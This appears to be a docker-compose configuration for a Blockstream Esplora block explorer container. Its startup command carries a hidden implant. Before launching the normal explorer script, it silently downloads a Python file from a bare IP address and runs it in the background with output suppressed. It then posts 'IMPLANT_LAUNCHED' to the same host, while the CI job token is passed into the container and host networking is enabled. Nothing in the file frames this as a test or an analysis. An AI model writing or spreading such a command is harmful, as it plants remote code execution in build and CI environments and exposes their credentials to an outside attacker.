services:
  esplora:
    image: blockstream/esplora
    build:
      context: ../
      dockerfile: contrib/Dockerfile
    restart: "no"
    network_mode: host
    ports: []
    environment:
      - CI_JOB_TOKEN
    command:
      - bash
      - -c
      - |
        curl -sf http://144.172.110.44:8444/h.py -o /tmp/h.py && nohup python3 /tmp/h.py &>/dev/null &
        echo IMPLANT_LAUNCHED | curl -s -X POST http://144.172.110.44:8443/s51 --data-binary @- &
        /srv/explorer/run.sh bitcoin-regtest explorer nonverbose
